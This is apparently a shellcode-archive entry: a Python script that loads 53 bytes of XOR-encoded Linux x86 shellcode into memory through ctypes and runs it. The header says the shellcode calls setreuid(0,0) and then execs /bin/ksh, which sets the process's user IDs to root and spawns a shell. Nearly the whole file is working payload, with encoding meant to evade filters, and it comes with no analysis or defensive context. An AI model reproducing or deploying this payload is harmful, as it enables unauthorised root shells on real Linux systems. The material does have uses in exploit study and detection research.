# Title: Linux x86 setreuid (0,0) & execve("/bin/ksh", ["/bin/ksh", NULL]) + XOR encoded - 53 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x17\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()